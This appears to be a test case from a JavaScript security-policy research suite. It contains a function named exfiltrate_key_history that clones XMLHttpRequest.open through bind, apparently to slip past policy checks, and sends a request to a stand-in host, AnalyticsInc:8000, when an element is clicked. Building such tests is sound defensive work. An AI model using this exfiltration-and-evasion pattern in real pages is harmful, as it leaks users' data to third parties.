// exfil_test_clone2.js
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v0 = xmlhttp;
  var v2 = xmlhttp.open;
  var v3 = JAM.call(v2.bind, v2, [xmlhttp], JAM.policy.p1);
  v0.opennew = v3;
  JAM.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone2", true], JAM.policy.p1);
  JAM.call(xmlhttp.send, xmlhttp, [null], JAM.policy.p1);
  return
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
